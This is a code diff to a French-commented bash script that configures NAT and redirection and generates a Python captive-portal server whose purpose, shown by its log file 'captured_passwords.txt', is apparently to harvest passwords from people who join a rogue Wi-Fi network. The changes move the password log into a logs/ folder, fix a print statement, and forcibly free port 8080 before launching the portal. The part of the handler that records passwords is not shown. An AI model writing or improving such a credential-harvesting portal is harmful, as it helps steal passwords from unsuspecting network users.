@@ -162,7 +162,7 @@ log "[✅] NAT et redirection configurés."
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 PORTAL_FILE="$SCRIPT_DIR/captive.py"
-LOG_FILE="$SCRIPT_DIR/captured_passwords.txt"
+LOG_FILE="$SCRIPT_DIR/logs/captured_passwords.txt"
 
 cat > "$PORTAL_FILE" <<'EOF'
 #!/usr/bin/env python3
@@ -172,7 +172,7 @@ import urllib.parse
 import os
 from datetime import datetime
 
-LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "captured_passwords.txt")
+LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs/captured_passwords.txt")
 
 class CaptiveHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
@@ -270,12 +270,20 @@ class CaptiveHandler(http.server.SimpleHTTPRequestHandler):
 if __name__ == "__main__":
     PORT = 8080
     with socketserver.TCPServer(("", PORT), CaptiveHandler) as httpd:
-        log "Portail captif lancé sur le port", PORT
+        print(f"Portail captif lancé sur le port {PORT}")
         httpd.serve_forever()
 EOF
 
 chmod +x "$PORTAL_FILE"
 log "[✅] Portail captif créé."
+
+# Avant de démarrer le portail captif, vérifions et libérons le port 8080
+log "[ℹ️] Vérification du port 8080..."
+if lsof -i:8080 > /dev/null 2>&1; then
+    log "[⚠️] Le port 8080 est déjà utilisé. Tentative de libération..."
+    fuser -k 8080/tcp || true
+    sleep 2
+fi
 
 start_service "python3 $PORTAL_FILE" "pgrep -f captive.py &>/dev/null" "Portail Captif"
 
